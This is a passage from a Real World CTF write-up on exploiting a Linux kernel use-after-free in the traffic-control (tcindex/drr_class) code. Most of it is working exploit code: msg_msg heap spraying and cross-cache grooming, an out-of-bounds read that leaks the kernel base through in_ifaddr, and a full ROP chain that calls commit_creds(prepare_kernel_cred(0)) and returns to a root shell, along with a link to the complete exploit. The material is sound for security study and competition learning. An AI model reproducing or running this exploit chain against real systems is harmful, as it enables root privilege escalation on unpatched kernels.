![](https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/ee2fecafly1hme192peuyj20oj0kkdga.jpg)

In fact, in addition to the time window, I also need to ensure that the drr_class object of the loop decrement is exactly the msg_msg object generated by prepare_copy. After the basic cross cache is done (explained in detail in the next section), it is just a general [heap spray](https://adamdoupe.com/publications/kheaps-exploit-reliability-usenix22.pdf) and the [multi-threading](https://libfuse.github.io/doxygen/structfuse__loop__config.html#aa91fc3ebb89633f27e94d8ab510bc37e) of FUSE to card points will reduce the success rate of exploitation. Drawing on the idea of [CVE-2022-29582](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#method), I found a precise positioning method.

Although `CONFIG_SLAB_FREELIST_RANDOM` exists, because unbind decrement is equivalent to m_ts decrement, after decrementing by 1, the drr_class object bound multiple times can be determined through the return value of MSG_COPY:

```c
static void find_cross_cache(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    send_del_filter(0x42);
    sleep(5);

    memset(&msg, 0, sizeof(msg));
    for (i = 0; i < 2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgrcv(g_qid[i], &msg, 0x3f, 0, IPC_NOWAIT | MSG_COPY);
        if (ret > 0) {
            found_cross_qid = i;
            break;
        }
    }

    if (found_cross_qid < 0) {
        printf("[-] Cannot find the cross cache one :(\n");
        exit(-1);
    }

    printf("[+] Find the cross cache one is at %d msgq\n", found_cross_qid);
}
```

Because the early defragmentation will result in a certain number of free objects remaining in kmem_cache_cpu, first release this object that has been identified through msgrcv (hang on per cpu partial), spray a page of msg_msg object, decrement by 1 to identify again this reoccupied msg_msg is the `Xth` allocated among the 32 (starting from 0), msgrcv this object again, finally allocate `X+1` msg_msg, and the next time you allocate, you can reoccupy the drr_class object that has been bound multiple times:

![](https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/ee2fecafly1hme1hghveuj20g80bvta0.jpg)

```c
static void find_reuse_one(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[found_cross_qid], &msg, 0x3f, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the cross cache one");

    msg.mtype = 1;
    memset(msg.mtext, 'G', sizeof(msg.mtext));
    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgsnd(g_reuse_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    send_del_filter(0x43);

    memset(&msg, 0, sizeof(msg));
    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgrcv(g_reuse_qid[i], &msg, 0x3f, 0, IPC_NOWAIT | MSG_COPY);
        if (ret > 0) {
            found_reuse_qid = i;
            break;
        }
    }

    if (found_reuse_qid < 0) {
        printf("[-] Cannot find the reuse one :(\n");
        exit(-1);
    }

    printf("[+] Find the reuse one is at %d msgq\n", found_reuse_qid);

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_reuse_qid[found_reuse_qid], &msg, 0x3f, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the reuse one");

    msg.mtype = 2;
    memset(msg.mtext, 'H', sizeof(msg.mtext));
    for (i = 0; i < found_reuse_qid + 1; i++) {
        ret = msgsnd(g_reuse_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }
}
```

## cross cache

To convert the drr_class of kmalloc-128 to the msg_msg of kmalloc-cg-128, a [cross cache](https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game) conversion is naturally required, with the [cache-of-castaways writeup](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html) providing a reference for using alloc_pg_vec to perform [heap fengshui](https://etenal.me/archives/1825). First, deplete the current kmalloc-128 and kmalloc-cg-128 slots, then separate the order 0 page with heap fengshui, allocate drr_class, bind one class to overflow, release all drr_class, and finally use msg_msg for placeholder:

```c
    drain_kmalloc_cg_128();
    drain_kmalloc_128();
    prepare_page_fengshui();
    alloc_drr_classes();
    bind_to_overflow();
    free_drr_classes();
    alloc_msg_msgs();
```

A question arises here: how many drr_class objects do I need to release for the corresponding slab to return to the buddy system? Referencing the [graphical explanation of slub](http://www.wowotech.net/memory_management/426.html), it is enough for the nr_partial of kmem_cache_node to be greater than the min_partial of kmem_cache. The migration of slab on per cpu partial depends on the cpu_partial member of kmem_cache, but the meaning of the cpu_partial is different in the original text and [official documents](https://www.kernel.org/doc/Documentation/ABI/testing/sysfs-kernel-slab). It is unclear whether it refers to the number of free objects or the number of pages hung on it.

I started testing the poc code on 5.15.94, combining the writeup of [CVE-2022-29582](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary) and discussions from web [searches](https://lore.kernel.org/linux-mm/CAG48ez2Qx5K1Cab-m8BdSibp6wLTip6ro4=-umR7BLsEgjEYzA@mail.gmail.com/T/#u), the previous explanation for cpu_partial was indeed the number of pages hung on it:

> This means that in practice, SLUB actually ends up keeping as many **pages** on the percpu partial lists as it intends to keep **free objects** there.

Later, after the compatibility fix in the [commit](https://github.com/torvalds/linux/commit/b47291ef02b0bee85ffb7efd6c336060ad1fe1a4), on 6.1.72, cpu_partial represents the number of free objects, and the boundary condition for slab migration is dynamically calculated:

```c
static void slub_set_cpu_partial(struct kmem_cache *s, unsigned int nr_objects)
{
	unsigned int nr_slabs;

	s->cpu_partial = nr_objects;

	/*
	 * We take the number of objects but actually limit the number of
	 * slabs on the per cpu partial list, in order to limit excessive
	 * growth of the list. For simplicity we assume that the slabs will
	 * be half-full.
	 */
	nr_slabs = DIV_ROUND_UP(nr_objects * 2, oo_objects(s->oo));
	s->cpu_partial_slabs = nr_slabs;
}
```

So, whether the maximum number of pages hung on per cpu partial is [30](https://elixir.bootlin.com/linux/v5.15.94/source/mm/slub.c#L4025) or [8](https://elixir.bootlin.com/linux/v6.1.72/source/mm/slub.c#L4154), the total I set is `SPRAY_PAGE_NUM + DRAIN_PAGE_NUM = 56`, which will eventually be returned to the buddy system:

```c
static void free_drr_classes(void)
{
    int i;

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_del_class(U_QDISC_HANDLE | (i));
    }

    for (i = 1; i <= DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_del_class(U_QDISC_HANDLE | (SPRAY_PAGE_NUM * ONEPAGE_K128_NUM + i));
    }

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        if ((i % ONEPAGE_K128_NUM) == 1)
            continue;
        send_del_class(U_QDISC_HANDLE | (i));
    }

    printf("[+] Free drr_class to buddy done\n");
}
```

## info leak

Now, by increasing m_ts to perform out-of-bound reading of msg_msg, we can place qid information in the content when generating msg_msg in advance, so we can know which msg_queue the adjacent msg_msg belongs to. In msgsnd, the sent msg_msg will be linked into the same `msq->q_messages`, so a new larger msg_msg with rop payload can be added, and after out-of-bound reading, the heap address with controllable content can be leaked:

```c
	if (!pipelined_send(msq, msg, &wake_q)) {
		/* no one is waiting for this message, enqueue it */
		list_add_tail(&msg->m_list, &msq->q_messages);
		msq->q_cbytes += msgsz;
		msq->q_qnum++;
		percpu_counter_add_local(&ns->percpu_msg_bytes, msgsz);
		percpu_counter_add_local(&ns->percpu_msg_hdrs, 1);
	}
```

As for leaking kernel base addresses, first look for a usable structure in kmalloc-cg-128, and refer to the [method](https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/#0x00-%E7%AE%80%E5%8D%95%E5%9B%9E%E9%A1%BE%E4%B8%8A%E6%AC%A1%E7%9A%84%E6%89%8B%E6%B3%95) of using user_key_payload for information leakage. Use CodeQL to query suitable structures. Although not many, the [in_ifaddr](https://elixir.bootlin.com/linux/v6.1.72/source/include/linux/inetdevice.h#L145) structure can be used. By deleting the IP address on the interface with [RTM_NEWADDR](https://elixir.bootlin.com/linux/v6.1.72/source/net/ipv4/devinet.c#L2789), the address of inet_rcu_free_ifa is written with [call_rcu](https://blog.csdn.net/zhoutaopower/article/details/86646688), and the kernel base address can be leaked again with out-of-bound reading.

![](https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/ee2fecafly1hme1hkkrnej215k0dqq6m.jpg)

```c
static struct in_ifaddr *inet_alloc_ifa(void)
{
	return kzalloc(sizeof(struct in_ifaddr), GFP_KERNEL_ACCOUNT);
}

static void inet_rcu_free_ifa(struct rcu_head *head)
{
	struct in_ifaddr *ifa = container_of(head, struct in_ifaddr, rcu_head);
	if (ifa->ifa_dev)
		in_dev_put(ifa->ifa_dev);
	kfree(ifa);
}

static void inet_free_ifa(struct in_ifaddr *ifa)
{
	call_rcu(&ifa->rcu_head, inet_rcu_free_ifa);
}
```

## rop chain

Finally, to trigger tcindex's enqueue with UAF again, a [dsmark](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_dsmark.c#L237) ancestor needs to be wrapped around it. By using [SO_PRIORITY](https://elixir.bootlin.com/linux/v6.1.72/source/net/core/sock.c#L1209) to specify the priority, the final res can be reached. Referencing [corjail](https://syst3mfailure.io/corjail/)'s rop, after privilege escalation, `find_task_by_vpid` can be used to find the task_struct and switch to a new fs_struct. However, attention needs to be paid to solve the [rcu_read_lock_bh](https://elixir.bootlin.com/linux/v6.1.72/source/net/core/dev.c#L4216) in `__dev_queue_xmit`, to remove the corresponding BH and rcu_read_lock, and to reduce the preemption count by 1:

```c
    kernel_offset = leaked_inet_rcu_free_ifa - 0xffffffff81e3b5d0;
    memset(buf, 0, sizeof(buf));
    memset(&msg, 0, sizeof(msg));

    msg.mtype = 3;
    *(uint64_t *)(msg.mtext) = kernel_offset + 0xffffffff81c77562; // enqueue: push rsi ; jmp qword ptr [rsi + 0x66]
    *(uint64_t *)(msg.mtext + 32) = 0; // stab
    *(uint32_t *)(msg.mtext + 168) = 0; // q.len
    *(uint64_t *)(msg.mtext + 0x66) = kernel_offset + 0xffffffff8112af1e; // pop rsp ; pop r15 ; ret
    *(uint64_t *)(msg.mtext + 8) = kernel_offset + 0xffffffff8108bbd8; // add rsp, 0xb0 ; jmp 0xffffffff82404c80

    rop = (uint64_t *)(msg.mtext + 0xc0);
    // rcu_read_lock_bh()
    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = kernel_offset + 0xffffffff81d435bd;
    *rop++ = kernel_offset + 0xffffffff8103e8a8; // pop rsi ; ret
    *rop++ = 0x200;
    *rop++ = kernel_offset + 0xffffffff811941a0; // __local_bh_enable_ip(_THIS_IP_, SOFTIRQ_DISABLE_OFFSET)

    // rcu_read_unlock()
    *rop++ = kernel_offset + 0xffffffff8120e350; // __rcu_read_unlock

    // BUG: scheduling while atomic: poc/224/0x00000002
    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = 1;
    *rop++ = kernel_offset + 0xffffffff811c2d20; // preempt_count_sub

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = 0;
    *rop++ = kernel_offset + 0xffffffff811bb740; // prepare_kernel_cred

    *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    *rop++ = 0;
    *rop++ = kernel_offset + 0xffffffff82068a2b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404c80
    *rop++ = kernel_offset + 0xffffffff811bb490; // commit_creds

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = kernel_offset + 0xffffffff837b1f20; // &init_fs
    *rop++ = kernel_offset + 0xffffffff8144b900; // copy_fs_struct
    *rop++ = kernel_offset + 0xffffffff811d9b0c; // push rax ; pop rbx ; jmp 0xffffffff82404c80

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = getpid();
    *rop++ = kernel_offset + 0xffffffff811b1e60; // find_task_by_vpid

    *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    *rop++ = 0x828;
    *rop++ = kernel_offset + 0xffffffff810705fe; // add rax, rcx ; jmp 0xffffffff82404c80
    *rop++ = kernel_offset + 0xffffffff816ac7a4; // mov qword ptr [rax], rbx ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp 0xffffffff82404c80
    rop += 8;

    *rop++ = kernel_offset + 0xffffffff82201146; // swapgs_restore_regs_and_return_to_usermode first mov
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (uint64_t)&get_root_shell;
    *rop++ = usr_cs;
    *rop++ = usr_rflags;
    *rop++ = usr_rsp;
    *rop++ = usr_ss;
```

The final exploit code takes less than half a minute, with a success rate close to 100%. The complete exploit code can be seen at: <https://github.com/Larryxi/rwctf-6th-riptc>.

![](https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/ee2fecafly1hme1hqcdbqj20u01hbn71.jpg)

# 0x04 Conclusion

In this competition, [@N1ghtu](https://github.com/N1ghtu) managed to solve the challenge in just one day, and it was the only solution in this competition. This demonstrates his daily accumulation and strong output. Specifically, the solution used [EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html) to leak kernel addresses, combined with the features of elastic object pg_vec (which is a dynamically generated heap address array), perfectly solving the issue of 2-level reference. The heap content is fully [user-controllable](https://vul.360.net/archives/391), and the challenge was smoothly and effortlessly exploited.

Regarding elastic structures and primitives of offset 24 minus 1, there has been consideration of using the [Dirty Pagetable](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606) method for exploitation, but there hasn't been time to put it into practice yet. It seems that the journey of research and learning is still long. As the saying goes, "It's hard to cook without rice". I believe that vulnerability discovery and exploitation complement each other, and both essentially involve the system code hack, albeit from different perspectives. From the perspective of CTF competitions, there needs to be some balance and trade-off to provide a smoother experience for the participants. Looking forward to meeting you in our next [RWCTF](https://www.realworldctf.com/) competition, thank you.
